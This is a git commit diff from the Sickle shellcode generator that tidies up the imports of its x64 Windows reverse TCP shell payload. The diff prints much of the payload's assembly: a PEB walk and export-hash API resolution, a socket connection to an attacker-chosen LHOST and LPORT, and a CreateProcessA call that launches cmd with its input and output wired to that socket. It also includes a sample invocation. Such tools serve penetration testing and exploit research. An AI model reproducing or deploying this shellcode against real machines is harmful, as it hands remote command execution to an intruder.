1e389fb2da5c6af1e299efc1d59a1b6f5f07ede2
wetw0rk <mvalen1997@gmail.com>
2025-05-14 21:23:31 -0500

    Cleaning up Windows Reverse Shell (x64)

--- src/sickle/payloads/windows/x64/shell_reverse_tcp.py
+++ src/sickle/payloads/windows/x64/shell_reverse_tcp.py
@@ -1,34 +1,21 @@
-from sys import argv
-from struct import pack
-from ctypes import sizeof
-from ctypes import c_uint64 
+import sys
+import ctypes
+import struct
+
+import sickle.common.lib.generic.convert as convert
+import sickle.common.lib.generic.mparser as modparser
+import sickle.common.lib.programmer.instantiator as builder
 
 from sickle.common.lib.reversing.assembler import Assembler
 
-from sickle.common.lib.programmer.instantiator import gen_offsets
-from sickle.common.lib.programmer.instantiator import init_sc_args
-from sickle.common.lib.programmer.instantiator import calc_stack_space
-
-from sickle.common.lib.generic.mparser import argument_check
-from sickle.common.lib.generic.convert import port_str_to_htons
-from sickle.common.lib.generic.convert import from_str_to_xwords
-from sickle.common.lib.generic.convert import ip_str_to_inet_addr
-from sickle.common.lib.generic.convert import from_str_to_win_hash
-
-from sickle.common.headers.windows.ntdef import _UNICODE_STRING
-from sickle.common.headers.windows.winnt import _IMAGE_DOS_HEADER
-from sickle.common.headers.windows.winnt import _IMAGE_NT_HEADERS64
-from sickle.common.headers.windows.winnt import _IMAGE_EXPORT_DIRECTORY
-from sickle.common.headers.windows.winnt import _IMAGE_OPTIONAL_HEADER64
-from sickle.common.headers.windows.winternl import _PEB
-from sickle.common.headers.windows.winternl import _PEB_LDR_DATA
-from sickle.common.headers.windows.winternl import _LDR_DATA_TABLE_ENTRY
-from sickle.common.headers.windows.ws2def import AF_INET
-from sickle.common.headers.windows.ws2def import sockaddr
-from sickle.common.headers.windows.ws2def import IPPROTO_TCP
-from sickle.common.headers.windows.winsock2 import SOCK_STREAM
-from sickle.common.headers.windows.processthreadsapi import _STARTUPINFOA
-from sickle.common.headers.windows.processthreadsapi import STARTF_USESTDHANDLES
+from sickle.common.headers.windows import (
+    winnt,
+    ntdef,
+    ws2def,
+    winternl,
+    winsock2,
+    processthreadsapi
+)
 
 class Shellcode():
 
@@ -40,7 +27,7 @@ class Shellcode():
 
     module = f"{platform}/{arch}/shell_reverse_tcp"
 
-    example_run = f"{argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
+    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
 
     ring = 3
 
@@ -89,17 +76,17 @@ class Shellcode():
             ],
         }
 
-        sc_args = init_sc_args(self.dependencies)
+        sc_args = builder.init_sc_args(self.dependencies)
         sc_args.update({
-            "wsaData"                       : 0x00, 
-            "name"                          : 0x00,
-            "lpStartInfo"                   : sizeof(_STARTUPINFOA),
-            "lpCommandLine"                 : len("cmd\x00\x00\x00\x00\x00"),
-            "lpProcessInformation"          : 0x00, 
+            "wsaData"              : 0x00, 
+            "name"                 : 0x00,
+            "lpStartInfo"          : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
+            "lpCommandLine"        : len("cmd\x00\x00\x00\x00\x00"),
+            "lpProcessInformation" : 0x00, 
        })
 
-        self.stack_space = calc_stack_space(sc_args, Shellcode.arch)
-        self.storage_offsets = gen_offsets(sc_args, Shellcode.arch)
+        self.stack_space = builder.calc_stack_space(sc_args, Shellcode.arch)
+        self.storage_offsets = builder.gen_offsets(sc_args, Shellcode.arch)
 
         return
 
@@ -116,12 +103,12 @@ getPEB:
     mov rcx, 0x60
     mov r8, gs:[rcx]
 getHeadEntry:
-    mov rdi, [r8 + {_PEB.Ldr.offset}]
-    mov rdi, [rdi + {_PEB_LDR_DATA.InLoadOrderModuleList.offset}]
+    mov rdi, [r8 + {winternl._PEB.Ldr.offset}]
+    mov rdi, [rdi + {winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
 search:
     xor rcx, rcx
-    mov rax, [rdi + {_LDR_DATA_TABLE_ENTRY.DllBase.offset}]
-    mov rsi, [rdi + {_LDR_DATA_TABLE_ENTRY.BaseDllName.offset + _UNICODE_STRING.Buffer.offset}]
+    mov rax, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
+    mov rsi, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]
     mov rdi, [rdi]
     cmp [rsi + 0x18], cx
     jne search
@@ -142,16 +129,16 @@ found:
 lookupFunction:
     push rbp
     mov rbp, rsp
-    mov ebx, [rdi + {_IMAGE_DOS_HEADER.e_lfanew.offset}]
-    add rbx, {_IMAGE_NT_HEADERS64.OptionalHeader.offset + _IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
+    mov ebx, [rdi + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
+    add rbx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
     add rbx, rdi
     mov eax, [rbx]
     mov rbx, rdi
     add rbx, rax
-    mov eax, [rbx + {_IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
+    mov eax, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
     mov r8, rdi
     add r8, rax
-    mov rcx, [rbx + {_IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
+    mov rcx, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
 parseNames:
     jecxz error
     dec ecx
@@ -172,11 +159,11 @@ calcDone:
     cmp r9d, edx
     jnz parseNames
 findAddress:
-    mov r8d, [rbx + {_IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
+    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
     add r8, rdi
     xor rax, rax
     mov ax, [r8 + rcx * 2]
-    mov r8d, [rbx + {_IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
+    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
     add r8, rdi
     mov eax, [r8 + rax * 4]
     add rax, rdi
@@ -191,23 +178,23 @@ error:
         """Generates the stub to load a library not currently loaded into a process
         """
 
-        lists = from_str_to_xwords(lib)
+        lists = convert.from_str_to_xwords(lib)
         write_index = self.storage_offsets['functionName']
 
         src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
 
         for i in range(len(lists["QWORD_LIST"])):
-            src += "    mov rcx, 0x{}\n".format( pack('<Q', lists["QWORD_LIST"][i]).hex() )
+            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
             src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
             write_index -= 8
 
         for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov ecx, dword 0x{}\n".format( pack('<L', lists["DWORD_LIST"][i]).hex() ) 
+            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() ) 
             src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
             write_index -= 4
 
         for i in range(len(lists["WORD_LIST"])):
-            src += "    mov cx, 0x{}\n".format( pack('<H', lists["WORD_LIST"][i]).hex() )
+            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
             src += "    mov [rbp-{}], cx\n".format(hex(write_index))
             write_index -= 2
 
@@ -241,7 +228,7 @@ error:
             for func in range(len(imports)):
                 stub += f"""
 get_{imports[func]}:
-    mov rdx, {from_str_to_win_hash(imports[func])}
+    mov rdx, {convert.from_str_to_win_hash(imports[func])}
     call lookupFunction
     mov [rbp - {self.storage_offsets[imports[func]]}], rax
                 """
@@ -252,7 +239,7 @@ get_{imports[func]}:
         """Returns bytecode generated by the keystone engine.
         """
 
-        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
+        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
         if (argv_dict == None):
             exit(-1)
 
@@ -290,9 +277,9 @@ call_WSAStartup:
 ;                   [in] GROUP               g,               // RSP+0x20
 ;                   [in] DWORD               dwFlags);        // RSP+0x28
 call_WSASocketA:
-    mov ecx, {AF_INET}
-    mov edx, {SOCK_STREAM}
-    mov r8, {IPPROTO_TCP}
+    mov ecx, {ws2def.AF_INET}
+    mov edx, {winsock2.SOCK_STREAM}
+    mov r8, {ws2def.IPPROTO_TCP}
     xor r9, r9
     mov [rsp+0x20], r9
     mov [rsp+0x28], r9
@@ -305,9 +292,9 @@ call_WSASocketA:
 ;                [in] int namelen);
 call_connect:
     mov rcx, rax
-    mov r8, {sizeof(sockaddr)}
+    mov r8, {ctypes.sizeof(ws2def.sockaddr)}
     lea rdx, [rbp - {self.storage_offsets['name']}]
-    mov r9, {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}{pack('<H', lport).hex()}0002
+    mov r9, {hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
     mov [rdx], r9
     xor r9, r9
     mov [rdx + 0x8], r9
@@ -319,18 +306,18 @@ memset_STARTUPINFOA:
     lea rdi, [rbp - {self.storage_offsets['lpStartInfo']}]  ; RDI = Destination ( memset(rdi, value, x) )
     mov rbx, rdi                                            ; Backup the pointer to the start of _STARTUPINFOA pointer
     xor eax, eax                                            ; EAX = 0x00 (value)
-    mov ecx, {int(sizeof(_STARTUPINFOA) / 0x04)}            ; 0x20 * sizeof(DWORD) = (x -> 0x80)
+    mov ecx, {int(ctypes.sizeof(processthreadsapi._STARTUPINFOA) / 0x04)}            ; 0x20 * sizeof(DWORD) = (x -> 0x80)
     rep stosd                                               ; Zero out x bytes
 
 init_STARTUPINFOA:
-    mov eax, {sizeof(_STARTUPINFOA)}
+    mov eax, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
     mov [rbx], eax
 
-    mov eax, {STARTF_USESTDHANDLES}
-    mov [rbx + {_STARTUPINFOA.dwFlags.offset}], eax
-    mov [rbx + {_STARTUPINFOA.hStdInput.offset}], rsi
-    mov [rbx + {_STARTUPINFOA.hStdOutput.offset}], rsi
-    mov [rbx + {_STARTUPINFOA.hStdError.offset}], rsi
+    mov eax, {processthreadsapi.STARTF_USESTDHANDLES}
+    mov [rbx + {processthreadsapi._STARTUPINFOA.dwFlags.offset}], eax
+    mov [rbx + {processthreadsapi._STARTUPINFOA.hStdInput.offset}], rsi
+    mov [rbx + {processthreadsapi._STARTUPINFOA.hStdOutput.offset}], rsi
+    mov [rbx + {processthreadsapi._STARTUPINFOA.hStdError.offset}], rsi
 
 ; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX
 ;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX
